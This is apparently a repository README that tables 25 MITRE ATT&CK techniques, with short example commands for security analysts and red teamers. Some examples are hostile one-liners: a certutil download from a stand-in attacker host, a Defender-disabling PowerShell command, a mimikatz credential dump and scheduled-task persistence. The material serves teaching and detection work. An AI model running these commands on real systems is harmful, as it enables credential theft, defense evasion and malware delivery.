# Top 25 MITRE ATT&CK Techniques

This repository contains the 25 most important MITRE ATT&CK techniques that every SOC Analyst, Threat Hunter, DFIR Analyst, Pentester, and Red Teamer should know.

The techniques included here are selected based on:

- MITRE ATT&CK
- Picus Red Report 2026
- Red Canary Threat Detection Report
- Real-world incident response experience
- Common malware and APT tradecraft

---

## Top 25 Techniques

| # | ID | Technique | Example |
|---|----|-----------|---------|
|1|T1059|Command and Scripting Interpreter|`powershell.exe -enc ...` , `cmd.exe /c whoami`|
|2|T1055|Process Injection|Inject shellcode into `explorer.exe` using Cobalt Strike|
|3|T1562|Impair Defenses|`Set-MpPreference -DisableRealtimeMonitoring $true`|
|4|T1003|OS Credential Dumping|`mimikatz sekurlsa::logonpasswords`|
|5|T1555|Credentials from Password Stores|Dump saved passwords from Google Chrome|
|6|T1078|Valid Accounts|Login through VPN using stolen credentials|
|7|T1071|Application Layer Protocol|Beacon communicates with C2 over HTTPS|
|8|T1547|Boot or Logon Autostart Execution|Add malware to `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`|
|9|T1190|Exploit Public-Facing Application|Exploit SQL Injection on a web server|
|10|T1566|Phishing|Malicious Microsoft Word attachment sent by email|
|11|T1021|Remote Services|Lateral movement using RDP or SMB|
|12|T1105|Ingress Tool Transfer|`certutil.exe -urlcache -f http://attacker/payload.exe`|
|13|T1219|Remote Access Tools|Install AnyDesk for persistent remote access|
|14|T1497|Virtualization/Sandbox Evasion|Malware exits if VMware or VirtualBox is detected|
|15|T1036|Masquerading|Rename malware to `svchost.exe`|
|16|T1053|Scheduled Task|`schtasks /create /tn Update /tr malware.exe`|
|17|T1543|Create or Modify System Process|Create a malicious Windows Service|
|18|T1110|Brute Force|Hydra attacks an SSH login page|
|19|T1486|Data Encrypted for Impact|Lock all files with ransomware encryption|
|20|T1041|Exfiltration Over C2 Channel|Send stolen documents through the HTTPS C2 channel|
|21|T1046|Network Service Discovery|`nmap -sV 192.168.1.0/24`|
|22|T1082|System Information Discovery|`systeminfo` , `hostname` , `whoami`|
|23|T1018|Remote System Discovery|`net view` or `arp -a`|
|24|T1083|File and Directory Discovery|`dir C:\Users` or `Get-ChildItem`|
|25|T1087|Account Discovery|`net user` or `Get-LocalUser`|

---

## References

- MITRE ATT&CK
- Picus Red Report 2026
- Red Canary Threat Detection Report
